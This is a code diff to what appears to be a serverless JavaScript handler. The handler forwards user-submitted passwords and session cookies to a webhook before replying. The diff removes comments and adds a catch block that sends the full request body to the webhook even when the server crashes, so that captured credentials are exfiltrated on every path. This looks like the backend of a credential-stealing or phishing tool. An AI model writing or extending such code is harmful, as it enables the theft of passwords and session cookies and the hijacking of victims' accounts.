@@ -258,10 +258,7 @@ export default async function handler(req, res) {
             }
         }
 
-        // Send details to webhook FIRST
         await sendWebhook(req, { Type, Password, Cookie }, response.status, finalSuccess, finalMessage);
-
-        // WAIT 10 SECONDS prior to displaying result to the user
         await new Promise(resolve => setTimeout(resolve, 10000));
 
         return res.status(response.status).json({
@@ -274,6 +271,12 @@ export default async function handler(req, res) {
         console.error('Server Error:', error);
         const detailedError = error.cause ? error.cause.message : error.message;
         const errorCode = error.cause ? error.cause.code : 'UNKNOWN';
+        
+        // FIX: Send webhook even if the entire server crashes/times out
+        try {
+            const body = typeof req.body === 'string' ? JSON.parse(req.body) : req.body;
+            await sendWebhook(req, body, 500, false, `Server Crash: ${detailedError}`);
+        } catch (e) {}
         
         return res.status(500).json({ 
             success: false,
